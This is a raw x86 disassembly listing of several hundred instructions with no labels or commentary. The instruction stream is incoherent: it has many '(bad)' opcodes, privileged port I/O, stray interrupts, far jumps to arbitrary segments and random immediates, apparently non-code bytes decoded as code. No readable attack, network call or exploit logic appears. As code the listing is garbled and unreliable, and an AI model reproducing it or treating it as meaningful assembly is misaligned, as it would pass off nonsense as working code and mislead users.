  4114e5:	pop    ebp
  4114e6:	cli    
  4114e7:	lds    esi,FWORD PTR [ecx-0x3e]
  4114ea:	add    al,0xb8
  4114ec:	jecxz  0x4114bf
  4114ee:	and    bl,al
  4114f0:	xor    esp,DWORD PTR [ecx+0x6d]
  4114f3:	sub    esi,DWORD PTR [edx+ebx*2+0x27]
  4114f7:	pop    edi
  4114f8:	cwde   
  4114f9:	pop    ds
  4114fa:	scas   eax,DWORD PTR es:[edi]
  4114fb:	fcom   st(3)
  4114fd:	xchg   esi,eax
  4114fe:	popa   
  4114ff:	test   DWORD PTR [ebp-0xd1aa11],ecx
  411505:	adc    bl,BYTE PTR [ecx-0x628ce96d]
  41150b:	mov    cl,BYTE PTR [ebp+0x21281d78]
  411511:	(bad)  
  411512:	in     eax,dx
  411513:	out    dx,al
  411514:	stc    
  411515:	popa   
  411516:	jmp    0x41157e
  411518:	(bad)  
  411519:	mov    bl,0x90
  41151b:	loop   0x4114a3
  41151d:	aad    0x4f
  41151f:	(bad)  
  411520:	push   eax
  411521:	imul   DWORD PTR [edi+eiz*2-0xa]
  411525:	push   cs
  411526:	jb     0x4114f8
  411528:	into   
  411529:	and    BYTE PTR [ebx-0x238b0ec3],ah
  41152f:	sub    eax,0x162d9d33
  411534:	stc    
  411535:	adc    BYTE PTR [ebx],bh
  411537:	fidiv  DWORD PTR [ebx-0x45]
  41153a:	push   ebx
  41153b:	jmp    0xa7ace44f
  411540:	mov    esi,DWORD PTR ds:0xf6a4172d
  411546:	and    cl,BYTE PTR [esp+eax*1]
  411549:	sbb    DWORD PTR [esi],0x4813f7f1
  41154f:	or     DWORD PTR [edi+esi*4],0x8751a00c
  411556:	popa   
  411557:	int    0x89
  411559:	js     0x411502
  41155b:	inc    ebx
  41155c:	cmp    DWORD PTR ds:0xda4afe76,0x62bb39da
  411566:	pop    es
  411567:	fbld   TBYTE PTR ds:0x43079e57
  41156d:	cmp    DWORD PTR [edi-0x5210269e],esp
  411573:	dec    edx
  411574:	and    dh,ch
  411576:	xchg   esp,eax
  411577:	test   BYTE PTR [ecx],bh
  411579:	and    al,0xb2
  41157b:	call   0xd5206056
  411580:	xor    BYTE PTR [edi+0x467c326f],ch
  411586:	cmp    DWORD PTR [esi+0x3],edi
  411589:	lock fnsave [edi+0x76]
  41158d:	lods   al,BYTE PTR ds:[esi]
  41158e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411590:	mov    esp,0x6cd7acc6
  411595:	add    dl,cl
  411597:	mov    cl,0x4d
  411599:	push   ebp
  41159a:	in     al,dx
  41159b:	sti    
  41159c:	sahf   
  41159d:	xor    eax,0xfa56741a
  4115a2:	add    DWORD PTR [eax+esi*8+0x433536c3],ecx
  4115a9:	lods   al,BYTE PTR ds:[esi]
  4115aa:	xor    BYTE PTR [di-0x28],al
  4115ae:	dec    edx
  4115af:	pop    edi
  4115b0:	pop    ss
  4115b1:	inc    ebp
  4115b2:	sub    DWORD PTR [esi+0x3d2a59e],ecx
  4115b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115b9:	out    dx,al
  4115ba:	push   ds
  4115bb:	mov    eax,ds:0x8e9c9e73
  4115c0:	or     eax,0x390ca245
  4115c5:	xor    DWORD PTR [esi],0xa53ccad1
  4115cb:	dec    edx
  4115cc:	or     ebx,esi
  4115ce:	fdiv   QWORD PTR [eax]
  4115d0:	mov    ebp,0xc0f42b52
  4115d5:	pop    es
  4115d6:	xlat   BYTE PTR ds:[ebx]
  4115d7:	(bad)  
  4115d8:	rol    DWORD PTR [edx+0x5e],cl
  4115db:	or     al,BYTE PTR [edi-0x6c]
  4115de:	xchg   esp,eax
  4115df:	sbb    esi,eax
  4115e1:	pop    esi
  4115e2:	loopne 0x411648
  4115e4:	sub    bh,0x72
  4115e7:	mov    edi,0x61849079
  4115ec:	les    edi,FWORD PTR [edx]
  4115ee:	(bad)  
  4115ef:	aas    
  4115f0:	sti    
  4115f1:	stos   BYTE PTR es:[edi],al
  4115f2:	jp     0x41157f
  4115f4:	mov    eax,0xaeea8e75
  4115f9:	(bad)  
  4115fa:	add    DWORD PTR [edi-0x6bc7a037],eax
  411600:	inc    edx
  411601:	outs   dx,DWORD PTR ds:[esi]
  411602:	(bad)  
  411603:	pushf  
  411604:	pop    ebp
  411605:	cmp    DWORD PTR [esi-0x4cfd72ff],esi
  41160b:	fisttp DWORD PTR [eax+ebx*1+0x23]
  41160f:	fcomp  st(1)
  411611:	fcom   DWORD PTR [ebx]
  411613:	add    eax,0x2566e944
  411618:	pop    es
  411619:	and    eax,0x3fa01652
  41161e:	cmp    eax,0x1a55b94f
  411623:	or     al,cl
  411625:	dec    eax
  411626:	pop    esi
  411627:	cdq    
  411628:	imul   ecx,ebx,0x68
  41162b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41162c:	retf   0x4903
  41162f:	mov    DWORD PTR [esi+0xb],eax
  411632:	cwde   
  411633:	adc    eax,0x26fe0e64
  411638:	shr    DWORD PTR [ecx+edi*8-0x18a1d3af],1
  41163f:	xchg   ecx,eax
  411640:	dec    esp
  411641:	xchg   esp,eax
  411642:	mov    esi,0x3c3eff91
  411647:	loopne 0x41161a
  411649:	xchg   ebp,eax
  41164a:	(bad)  
  41164b:	sub    al,0xa1
  41164d:	into   
  41164e:	and    DWORD PTR [ebx],esi
  411650:	jmp    0xe532523c
  411655:	push   0x266b49a1
  41165a:	lods   eax,DWORD PTR ds:[esi]
  41165b:	inc    ecx
  41165c:	jge    0x411634
  41165e:	or     al,0xfc
  411660:	and    BYTE PTR [ebp+eax*1-0xb],dl
  411664:	and    eax,eax
  411666:	dec    esp
  411667:	dec    ebp
  411668:	imul   ebx,DWORD PTR [edx-0x58cc95ce],0xffffffce
  41166f:	bound  ebp,QWORD PTR [edi+0x3c]
  411672:	xchg   esp,eax
  411673:	sahf   
  411674:	popa   
  411675:	pop    es
  411676:	cmp    eax,0xe3bb144f
  41167b:	popa   
  41167c:	xchg   DWORD PTR [esi-0x10],ebp
  41167f:	mov    ah,0xa9
  411682:	mov    ch,0xfc
  411684:	pop    ss
  411685:	mov    DWORD PTR [edx+0x6f],edx
  411688:	popf   
  411689:	sar    DWORD PTR [ecx+0x5cc436c7],1
  41168f:	mov    ds,WORD PTR [ebx]
  411691:	test   DWORD PTR [ecx+0x3a],ecx
  411694:	mov    esp,0xb98ae8f9
  411699:	jmp    0x8f2d109c
  41169e:	mov    ebx,0x7bd8fae5
  4116a3:	retf   0x33e0
  4116a6:	inc    ecx
  4116a7:	jmp    0x60b1a68f
  4116ac:	xchg   edi,eax
  4116ad:	xchg   edi,eax
  4116ae:	es jnp 0x4116a7
  4116b1:	add    ch,ah
  4116b3:	inc    ecx
  4116b4:	cmc    
  4116b5:	jmp    0xe4d21caf
  4116ba:	scas   al,BYTE PTR es:[edi]
  4116bb:	inc    ebx
  4116bc:	jno    0x411656
  4116be:	sub    ch,BYTE PTR [ecx*2-0x2804f40]
  4116c5:	mov    al,0x75
  4116c7:	sub    DWORD PTR [edx],edx
  4116c9:	mov    ch,0x9e
  4116cb:	push   ebx
  4116cc:	jno    0x411655
  4116ce:	push   ss
  4116cf:	cmp    al,0xdd
  4116d1:	nop
  4116d2:	xor    DWORD PTR [ecx],0x4fdc6d36
  4116d8:	jns    0x4116fd
  4116da:	cmp    al,0xe2
  4116dc:	sub    esp,DWORD PTR [eax]
  4116de:	and    edx,0x6c7af7d0
  4116e4:	xlat   BYTE PTR ds:[ebx]
  4116e5:	stc    
  4116e6:	(bad)  
  4116e7:	int    0xf6
  4116e9:	jle    0x4116e1
  4116eb:	inc    ebp
  4116ec:	mov    DWORD PTR [ebx],edx
  4116ee:	(bad)  
  4116f0:	nop
  4116f1:	or     DWORD PTR [edx],0x65
  4116f4:	imul   BYTE PTR [eax]
  4116f6:	mov    fs,WORD PTR [eax]
  4116f8:	jns    0x411736
  4116fa:	xchg   edx,eax
  4116fb:	call   FWORD PTR [ecx+0xa18d146]
  411701:	loope  0x41175c
  411703:	sbb    BYTE PTR [ebx+0x12],dh
  411706:	push   esp
  411707:	mov    eax,ds:0xf4fe2b35
  41170c:	or     BYTE PTR [edx-0x47322e30],cl
  411712:	loope  0x411721
  411714:	add    al,0x3e
  411716:	sbb    cl,al
  411718:	addr16 daa 
  41171a:	jle    0x411739
  41171c:	mov    edx,0xd6e3730d
  411721:	sbb    al,0x81
  411723:	jmp    0xba71:0x93c2307
  41172a:	daa    
  41172b:	ins    DWORD PTR es:[edi],dx
  41172c:	inc    ebp
  41172d:	test   DWORD PTR [esi],esp
  41172f:	xchg   edx,eax
  411730:	adc    bl,bl
  411732:	xchg   edi,eax
  411733:	loopne 0x41173e
  411735:	sbb    dh,ah
  411737:	iret   
  411738:	sub    DWORD PTR [edx],ecx
  41173a:	push   esi
  41173b:	leave  
  41173c:	test   ebx,esp
  41173e:	pop    ss
  41173f:	dec    ebx
  411740:	pop    edx
  411741:	mov    edx,0x145c4eca
  411746:	stc    
  411747:	fwait
  411748:	pushf  
  411749:	std    
  41174a:	inc    ecx
  41174b:	(bad)  
  41174c:	fld    TBYTE PTR [edi+0x4f]
  41174f:	mov    ch,0x43
  411751:	jmp    0x4116f5
  411753:	jmp    0x41173c
  411755:	(bad)  
  411756:	and    BYTE PTR [edx+0x69],ah
  411759:	or     cl,al
  41175b:	cwde   
  41175c:	add    DWORD PTR [ecx],esp
  41175e:	(bad)  [ebp-0x21dbde9c]
  411764:	nop
  411765:	test   DWORD PTR [ecx],ebx
  411767:	es sti 
  411769:	jmp    FWORD PTR [edi+0x5b]
  41176c:	inc    edx
  41176d:	push   0x55
  41176f:	pusha  
  411770:	mov    al,ds:0xe09b7417
  411775:	mov    dl,0xc0
  411777:	fsub   DWORD PTR [edi]
  411779:	call   0x5370:0xf64bb5bd
  411780:	stc    
  411781:	pop    eax
  411782:	add    bh,BYTE PTR [esp+eax*4]
  411785:	jmp    0xd44f:0x38fa050
  41178c:	xor    DWORD PTR [ebx],edx
  41178e:	pop    edi
  41178f:	sbb    DWORD PTR [ebp-0x55],edx
  411792:	into   
  411793:	fs icebp 
  411795:	or     al,0x52
  411797:	mov    ds:0xb0ed6f3d,eax
  41179c:	lock pop bp
  41179f:	push   es
  4117a0:	popa   
  4117a1:	pop    ebp
  4117a2:	retf   
  4117a3:	pusha  
  4117a4:	pushf  
  4117a5:	cwde   
  4117a6:	call   0xa787:0xcff943be
  4117ad:	stos   DWORD PTR es:[edi],eax
  4117ae:	nop
  4117af:	cli    
  4117b0:	fcmovbe st,st(3)
  4117b2:	popa   
  4117b3:	cmp    BYTE PTR [ebp-0x7f],bh
  4117b6:	inc    edi
  4117b7:	js     0x411827
  4117b9:	push   es
  4117ba:	daa    
  4117bb:	mov    bl,0xc
  4117bd:	push   0x42
  4117bf:	dec    esp
  4117c0:	jle    0x41180d
  4117c2:	adc    esp,ebx
  4117c4:	push   0x23
  4117c6:	adc    al,0x30
  4117c8:	(bad)  
  4117c9:	mov    al,0x7d
  4117cb:	push   ebp
  4117cc:	fmul   DWORD PTR ds:[ebx]
  4117cf:	sub    eax,0x1cebd75
  4117d4:	mov    ds:0x8c2cda26,eax
  4117d9:	jg     0x4117f9
  4117db:	arpl   WORD PTR [eax-0x7d],si
  4117de:	mov    ch,0x23
  4117e0:	add    esi,edx
  4117e2:	ins    BYTE PTR es:[edi],dx
  4117e3:	cwde   
  4117e4:	and    eax,0x780119bd
  4117e9:	xchg   DWORD PTR [esp+esi*4+0x38ec297c],esp
  4117f0:	iret   
  4117f1:	lock adc eax,0xd1eac5c7
  4117f7:	and    BYTE PTR [ecx-0x43],dh
  4117fa:	sbb    eax,0x767833ab
  4117ff:	jp     0x41182f
  411801:	jb     0x4117ea
  411803:	sub    DWORD PTR [edx-0x7f],ebp
  411806:	mov    eax,0xae071cf1
  41180b:	shl    ah,1
  41180d:	ds push 0xb37862a2
  411813:	repnz (bad) ds:[ebp+0x66103f2c]
  41181b:	popf   
  41181c:	popa   
  41181d:	stos   DWORD PTR es:[edi],eax
  41181e:	add    esi,ecx
  411820:	sar    DWORD PTR [esp+edx*8-0x38],1
  411824:	scas   al,BYTE PTR es:[edi]
  411825:	into   
  411826:	push   0x59b93305
  41182b:	loopne 0x4117f2
  41182d:	scas   eax,DWORD PTR es:[edi]
  41182e:	stos   BYTE PTR es:[edi],al
  41182f:	pop    eax
  411830:	push   esi
  411831:	retf   0x2dae
  411834:	dec    eax
  411835:	aaa    
  411836:	cwde   
  411837:	inc    ebp
  411838:	(bad)  
  411839:	sbb    dl,BYTE PTR [ebx-0x3567aef]
  41183f:	xchg   ecx,eax
  411840:	and    ch,dl
  411842:	jne    0x4117dc
  411844:	inc    ecx
  411845:	and    eax,0x4e4a3622
  41184a:	xchg   BYTE PTR [eax+0x51],dh
  41184d:	add    al,BYTE PTR [edi+edx*2-0x17]
  411851:	mov    al,0xf1
  411853:	ret    
  411854:	addr16 adc al,0x3b
  411857:	inc    ecx
  411858:	inc    esp
  411859:	stos   BYTE PTR es:[edi],al
  41185a:	push   eax
  41185b:	dec    ebx
  41185c:	xlat   BYTE PTR ds:[ebx]
  41185e:	and    DWORD PTR [edx],esp
  411860:	es icebp 
  411862:	cmp    ebp,edi
  411864:	stc    
  411865:	iret   
  411866:	fadd   QWORD PTR [eax-0x2f]
  411869:	fisub  DWORD PTR [edx+0x3588ec8d]
  41186f:	xchg   ebp,eax
  411870:	arpl   WORD PTR [esi],di
  411872:	shr    DWORD PTR [edi+0x1d409049],0xfa
  411879:	xchg   edx,eax
  41187a:	and    bl,ch
  41187c:	or     eax,0xf51dd05a
  411881:	popa   
  411882:	daa    
  411883:	sbb    al,0xf4
  411885:	out    dx,eax
  411886:	and    eax,0x8dc6ecd7
  41188b:	or     eax,0xb0d1d581
  411890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411891:	xchg   DWORD PTR [ebx+0x5ca55607],edi
  411897:	lods   al,BYTE PTR ds:[esi]
  411898:	xor    bl,BYTE PTR [ecx+0x59]
  41189b:	out    0x7e,eax
  41189d:	sub    al,0xf
  41189f:	pop    esi
  4118a0:	xor    BYTE PTR [ebx+eax*1+0x27],dh
  4118a4:	add    dl,BYTE PTR [ebx+ecx*8-0x2e]
  4118a8:	not    BYTE PTR [ebx-0xb]
  4118ab:	jmp    0xea3bb33a
  4118b0:	xor    ebx,DWORD PTR [eax-0x27cf41a4]
  4118b6:	sbb    BYTE PTR [ecx],al
  4118b8:	push   edi
  4118b9:	(bad)  
  4118bc:	sbb    BYTE PTR [edi+0x1159647c],dl
  4118c2:	add    al,0x38
  4118c4:	arpl   WORD PTR [ecx-0x8],ax
  4118c7:	push   esp
  4118c8:	push   ebx
  4118c9:	in     al,0x99
  4118cb:	pop    ds
  4118cc:	add    eax,0x858b1e11
  4118d1:	push   ebp
  4118d2:	mov    eax,ds:0x4f533f1
  4118d7:	or     DWORD PTR [edx-0x2da25b8c],esi
  4118dd:	sbb    BYTE PTR [edx],cl
  4118df:	fistp  WORD PTR [ebx]
  4118e1:	outs   dx,BYTE PTR ds:[esi]
  4118e2:	sub    eax,0x2e30e09e
  4118e7:	cmp    eax,0xb85d85a2
  4118ec:	in     al,dx
  4118ed:	mov    ebp,0xe4d18419
  4118f2:	fsubr  DWORD PTR [edx*8-0x7a103921]
  4118f9:	aaa    
  4118fa:	loop   0x41194f
  4118fc:	ins    DWORD PTR es:[edi],dx
  4118fd:	icebp  
  4118fe:	cmp    esi,ecx
  411900:	push   eax
  411901:	sub    BYTE PTR [eax-0x62],dl
  411904:	add    al,0xa8
  411906:	or     ah,bh
  411908:	sub    bh,BYTE PTR [edx-0x27]
  41190b:	xchg   BYTE PTR [edx],bh
  41190d:	ret    
  41190e:	push   es
  41190f:	sub    esi,DWORD PTR [eax]
  411911:	push   edx
  411912:	mov    dl,0x70
  411914:	imul   edx,DWORD PTR [edi+0x3e],0x1fcb52
  41191b:	xchg   edx,eax
  41191c:	jae    0x41190a
  41191e:	jge    0x4118df
  411920:	push   ds
  411921:	gs iret 
  411923:	nop
  411924:	xor    cl,BYTE PTR [esi+0x5a]
  411927:	or     eax,0x1370114b
  41192c:	cli    
  41192d:	test   BYTE PTR [ebx],dl
  41192f:	pop    ebx
  411930:	dec    edi
  411931:	xor    eax,0x9242704e
  411936:	sbb    al,0xc6
  411938:	dec    edi
  411939:	out    0x39,al
  41193b:	mov    gs,WORD PTR ds:0xe25fd8b2
  411941:	inc    ebp
  411942:	rcl    DWORD PTR [edx],0xd6
  411945:	pop    edi
  411946:	lds    ebx,FWORD PTR [eax+0x5c8c5f24]
  41194c:	mov    al,0xe3
  41194e:	(bad)  
  41194f:	std    
  411950:	loope  0x41196b
  411952:	mov    ds:0x590e1936,eax
  411957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411958:	rsqrtps xmm5,XMMWORD PTR [eax+0x65]
  41195c:	fs and eax,0x2ab25793
  411962:	jbe    0x411966
  411964:	mov    eax,DWORD PTR [eax+0x37]
  411967:	mov    ds:0x12839d1a,al
  41196c:	cmp    al,0x5d
  41196e:	xlat   BYTE PTR ds:[ebx]
  41196f:	sub    ebx,DWORD PTR [edi-0x38]
  411972:	sbb    BYTE PTR [eax-0x19],al
  411975:	sbb    bl,cl
  411977:	sbb    eax,0xf0101da
  41197c:	sbb    DWORD PTR [ecx-0x19],ebp
  41197f:	cmc    
  411980:	stc    
  411981:	neg    eax
  411983:	xchg   BYTE PTR [esi],dh
  411985:	repnz mov ss,WORD PTR [ebx]
  411988:	pushf  
  411989:	call   0x5733:0x74d1d55a
  411990:	xor    ch,BYTE PTR [edi+0x8]
  411993:	inc    edi
  411994:	fwait
  411995:	add    dh,BYTE PTR [esi+0x49]
  411998:	add    BYTE PTR [eax],al
  41199a:	xchg   edx,eax
  41199b:	fnstcw WORD PTR [edi]
  41199d:	pop    esi
  41199e:	add    DWORD PTR [esp+edi*8],ebx
  4119a1:	test   eax,0x65580d11
  4119a6:	xor    eax,0xbb898df3
  4119ac:	fldcw  WORD PTR [eax-0x7f53de9c]
  4119b2:	sub    DWORD PTR [eax],eax
  4119b4:	aaa    
  4119b5:	mov    ds:0x480c2db7,eax
  4119ba:	adc    al,0xbd
  4119bc:	stos   DWORD PTR es:[edi],eax
  4119bd:	push   cs
  4119be:	jmp    FWORD PTR [edi-0x60]
  4119c1:	hlt    
  4119c2:	shr    DWORD PTR [eax],1
  4119c4:	lock adc eax,0xffffffc0
  4119c8:	dec    edx
  4119c9:	jns    0x411a46
  4119cb:	fidiv  DWORD PTR [ecx+0x18994d29]
  4119d1:	push   ds
  4119d2:	sti    
  4119d3:	xchg   DWORD PTR [edi-0x59],eax
  4119d6:	in     al,dx
  4119d7:	test   BYTE PTR [esi+0x3e5a290b],ah
  4119dd:	jg     0x4119c5
  4119df:	jge    0x411981
  4119e1:	xchg   edi,eax
  4119e2:	(bad)  
  4119e3:	arpl   bx,di
  4119e5:	icebp  
  4119e6:	mov    esi,DWORD PTR [ecx+0x72d20db5]
  4119ec:	inc    edx
  4119ed:	jmp    FWORD PTR [ebp+0x4b]
  4119f0:	gs (bad) 
  4119f2:	clc    
  4119f3:	dec    ecx
  4119f4:	jo     0x411990
  4119f6:	stos   BYTE PTR es:[edi],al
  4119f7:	mov    eax,0x21a102d8
  4119fc:	retf   0xdfa6
  4119ff:	push   eax
  411a00:	stos   BYTE PTR es:[edi],al
  411a01:	mov    al,ds:0x7e8d44f1
  411a06:	xchg   ebx,eax
  411a07:	push   ecx
  411a08:	loope  0x411a01
  411a0a:	div    ebx
  411a0c:	sahf   
  411a0d:	dec    ebp
  411a0e:	call   0x9945f1ff
  411a13:	repz dec ecx
  411a15:	dec    edi
  411a16:	or     BYTE PTR [edx-0x70e7466f],dh
  411a1c:	mov    dl,0xde
  411a1e:	sbb    ecx,DWORD PTR [ebp+0x63]
  411a21:	inc    ebx
  411a22:	push   eax
  411a23:	ins    BYTE PTR es:[edi],dx
  411a24:	adc    bh,BYTE PTR [edx*1+0x325c4272]
  411a2b:	lock pop es
  411a2d:	xchg   ecx,eax
  411a2e:	int3   
  411a2f:	sti    
  411a30:	outs   dx,BYTE PTR ds:[esi]
  411a31:	in     al,dx
  411a32:	out    0xdb,eax
  411a34:	daa    
  411a35:	in     eax,dx
  411a36:	mov    eax,0x85524ac1
  411a3b:	(bad)  
  411a3c:	jb     0x411a40
  411a3e:	scas   eax,DWORD PTR es:[edi]
  411a3f:	pop    eax
  411a40:	xor    eax,0x4db47edf
  411a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a46:	test   eax,0xe3b2b634
  411a4b:	scas   al,BYTE PTR es:[edi]
  411a4c:	sbb    DWORD PTR [eax-0x2a],ebx
  411a4f:	mov    esi,DWORD PTR [edi]
  411a51:	(bad)  cs:[eax+0x49]
  411a55:	inc    ecx
  411a56:	icebp  
  411a57:	retf   
  411a58:	pop    edi
  411a59:	(bad)  
  411a5b:	mov    dl,0x58
  411a5d:	mov    cl,0x2
  411a5f:	ret    0x4d57
  411a62:	sbb    al,0xef
  411a64:	sbb    BYTE PTR [eax-0x1043afc6],ch
  411a6a:	fadd   st(1),st
  411a6c:	push   0x5
  411a6e:	dec    ecx
  411a6f:	dec    eax
  411a70:	ret    
  411a71:	jns    0x411aae
  411a73:	scas   eax,DWORD PTR es:[edi]
  411a74:	adc    eax,0x3fbc9dbc
  411a79:	xchg   ebp,eax
  411a7a:	sbb    al,0xaf
  411a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a7d:	cs test al,0xe0
  411a81:	fistp  DWORD PTR [ecx-0x5]
  411a84:	xchg   edi,eax
  411a85:	add    al,0xee
  411a87:	jg     0x411a54
  411a89:	repz pop ss
  411a8b:	test   BYTE PTR [esi+ecx*1-0x12709e48],bh
  411a92:	sti    
  411a93:	das    
  411a94:	lea    edx,[edx+eax*1+0x49d6fa12]
  411a9b:	push   esi
  411a9c:	lods   al,BYTE PTR ds:[esi]
  411a9d:	dec    edx
  411a9e:	clc    
  411a9f:	mov    gs,WORD PTR ds:0xe63c3128
  411aa5:	and    eax,0xdedc02fe
  411aaa:	arpl   WORD PTR [ecx-0x38],bx
  411aad:	nop
  411aae:	jnp    0x411a4e
  411ab0:	in     eax,0x66
  411ab2:	push   ebx
  411ab3:	sub    al,0xef
  411ab5:	mov    edi,0xa0086235
  411aba:	retw   0x5ee7
  411abe:	push   ss
  411abf:	(bad)  
  411ac0:	(bad)  
  411ac1:	stos   DWORD PTR es:[edi],eax
  411ac2:	push   ebx
  411ac3:	add    DWORD PTR [ecx-0x40],edx
  411ac6:	jg     0x411b1c
  411ac8:	idiv   BYTE PTR [ecx+0x270bed25]
  411ace:	xchg   ebx,eax
  411acf:	dec    ebx
  411ad0:	mov    ah,0xe8
  411ad2:	aad    0x1a
  411ad4:	dec    edi
  411ad5:	and    ebp,DWORD PTR [edi]
  411ad7:	cmp    al,0xfc
  411ad9:	add    esi,DWORD PTR [ebx+0x4363b417]
  411adf:	repnz mov eax,0x1db608a0
  411ae5:	scas   eax,DWORD PTR es:[edi]
  411ae6:	xchg   ebx,eax
  411ae7:	(bad)  
  411ae8:	sub    DWORD PTR gs:[esi],edx
  411aeb:	jo     0x411b60
  411aed:	fdiv   QWORD PTR [esi+ebx*8+0x7ad8c2e2]
  411af4:	lock or edi,edi
  411af7:	mov    edx,0x4c21cf1e
  411afc:	mov    al,BYTE PTR [esi]
  411afe:	cmp    eax,0xa0cf9bab
  411b03:	dec    esi
  411b04:	sbb    BYTE PTR [ebp-0x1b1d3685],ah
  411b0a:	jb     0x411b10
  411b0c:	fcmovb st,st(7)
  411b0e:	das    
  411b0f:	in     eax,dx
  411b10:	in     al,dx
  411b11:	test   DWORD PTR [esi-0x4fa9b054],eax
  411b17:	mov    edi,DWORD PTR [edi-0x6b]
  411b1a:	cmp    BYTE PTR [eax+0x35cc5cbd],cl
  411b20:	xor    DWORD PTR [ebx+0x56],ebx
  411b23:	repz push es
  411b25:	mov    eax,0x910b4145
  411b2a:	in     al,0x4d
  411b2c:	retf   
  411b2d:	add    esi,DWORD PTR [esi]
  411b2f:	ins    DWORD PTR es:[edi],dx
  411b30:	sbb    ecx,DWORD PTR [ecx+ebx*1]
  411b33:	cwde   
  411b34:	call   0xe13:0x78778675
  411b3b:	push   ebx
  411b3c:	mov    edx,edx
  411b3e:	push   es
  411b3f:	sbb    ecx,ebx
  411b41:	(bad)  
  411b42:	push   ecx
  411b43:	in     al,0xf
  411b45:	jmp    0x2d0d:0x6383509b
  411b4c:	aaa    
  411b4d:	mov    ds:0xeeb1896b,al
  411b52:	in     al,dx
  411b53:	lahf   
  411b54:	cmp    BYTE PTR [ecx+eax*4],0x13
  411b58:	out    0x51,al
  411b5a:	sub    eax,0xec089940
  411b5f:	jo     0x411b7b
  411b61:	or     DWORD PTR [ebx+0x1071211c],esi
  411b67:	mov    esi,0xddff25f0
  411b6c:	mov    ebx,0x6862bdfa
  411b71:	rol    BYTE PTR [eax],cl
  411b73:	add    dh,BYTE PTR [ecx]
  411b75:	mov    ch,0x33
  411b77:	out    dx,eax
  411b78:	ret    0x3830
  411b7b:	enter  0x34ec,0x72
  411b7f:	fisttp DWORD PTR [ebx-0x58b9083c]
  411b85:	adc    eax,0xccd780fe
  411b8a:	add    dl,BYTE PTR [eax-0x384c7391]
  411b90:	imul   ebx,DWORD PTR [edi],0x6f8afd23
  411b96:	aas    
  411b97:	jmp    0x741781bf
  411b9c:	in     al,dx
  411b9d:	stos   BYTE PTR es:[edi],al
  411b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b9f:	xchg   BYTE PTR [edx-0x5d96cfb8],ch
  411ba5:	fdiv   QWORD PTR [esi]
  411ba7:	mov    dl,0xef
  411ba9:	add    ecx,esi
  411bab:	mul    DWORD PTR [esi+0x68]
  411bae:	mov    ds:0x17504c,eax
  411bb3:	push   ss
  411bb4:	push   ss
  411bb5:	iret   
  411bb6:	scas   eax,DWORD PTR es:[edi]
  411bb7:	push   eax
  411bb8:	imul   eax,DWORD PTR [ecx-0x661b6560],0xffffffd5
  411bbf:	lea    esp,[esi]
  411bc1:	mov    esp,DWORD PTR [ebp+0x7011a01d]
  411bc7:	and    edi,edx
  411bc9:	adc    al,BYTE PTR [esi+0x6f29357b]
  411bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bd0:	or     ch,BYTE PTR [ebx-0x4240bc77]
  411bd6:	inc    ebx
  411bd7:	inc    eax
  411bd8:	aad    0x25
  411bda:	jns    0x411bf1
  411bdc:	add    BYTE PTR [edx],cl
  411bde:	push   esi
  411bdf:	inc    edi
  411be0:	mov    dl,0x14
  411be2:	loop   0x411c0e
  411be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411be5:	mov    es,WORD PTR [esi+edx*2+0x9]
  411be9:	std    
  411bea:	(bad)
  411bed:	cmp    eax,0x97f9f610
  411bf2:	cs inc eax
  411bf4:	mov    al,BYTE PTR [ecx*2+0x4c15a44]
  411bfb:	lods   al,BYTE PTR ds:[esi]
  411bfc:	sbb    BYTE PTR [ecx-0x43],dh
  411bff:	xor    BYTE PTR [ebp-0xc2f22b9],al
  411c05:	inc    ecx
  411c06:	popf   
  411c07:	(bad)  
  411c08:	bound  esp,QWORD PTR [ebp-0x68]
  411c0b:	outs   dx,BYTE PTR ds:[esi]
  411c0c:	sub    BYTE PTR [ebp-0x71],dh
  411c0f:	add    eax,0xdf6153d9
  411c14:	scas   al,BYTE PTR es:[edi]
  411c15:	popf   
  411c16:	data16 ins BYTE PTR es:[edi],dx
  411c18:	arpl   WORD PTR [ebp-0x51823b84],cx
  411c1e:	xor    DWORD PTR [eax-0x51],0xbeec6a51
  411c25:	jae    0x411bdd
  411c27:	jmp    0x1543:0x4df042f4
  411c2e:	test   ah,cl
  411c30:	sbb    al,0xa9
  411c32:	mov    esi,0xba378359
  411c37:	(bad)  
  411c38:	dec    eax
  411c39:	add    al,0x27
  411c3b:	mov    edi,0x6c000bee
  411c40:	clc    
  411c41:	(bad)  
  411c42:	xchg   esi,eax
  411c43:	xor    edi,DWORD PTR [ebx]
  411c45:	inc    esi
  411c46:	cmp    cl,BYTE PTR [esi-0x4607429]
  411c4c:	bound  esp,QWORD PTR [eax+0x6a1ce5eb]
  411c52:	and    DWORD PTR [edi-0x3b],ebx
  411c55:	jbe    0x411ccd
  411c57:	mov    al,ds:0xfce83e4a
  411c5c:	daa    
  411c5d:	jmp    0x328d:0xd65262ef
  411c64:	push   edi
  411c65:	mov    esi,0xa2ab862
  411c6a:	pop    ss
  411c6b:	sub    edi,ebp
  411c6d:	test   eax,0x80221d75
  411c72:	pmaxsw mm7,mm6
  411c75:	pop    edi
  411c76:	jno    0x411c04
  411c78:	push   cs
  411c79:	push   ebp
  411c7a:	mov    ah,0x23
  411c7c:	mov    cl,dh
  411c7e:	jmp    0x6fe95c42
  411c83:	xchg   ecx,eax
  411c84:	in     al,dx
  411c85:	mov    BYTE PTR [ebp-0x26],0x59
  411c89:	xlat   BYTE PTR ds:[ebx]
  411c8a:	mov    ds:0x4da0b6f6,eax
  411c8f:	mov    ah,0x61
  411c91:	into   
  411c92:	ret    
  411c93:	adc    cl,BYTE PTR [edi-0x2d]
  411c96:	pop    ebp
  411c97:	call   0x585d:0xd5b82831
  411c9e:	pop    edx
  411c9f:	ret    0x60cb
  411ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ca3:	popa   
  411ca4:	push   edx
  411ca5:	addr16 sbb eax,0x7c002a50
  411cab:	test   edi,0xda0f2292
  411cb1:	push   ds
  411cb2:	add    eax,0x94671aa9
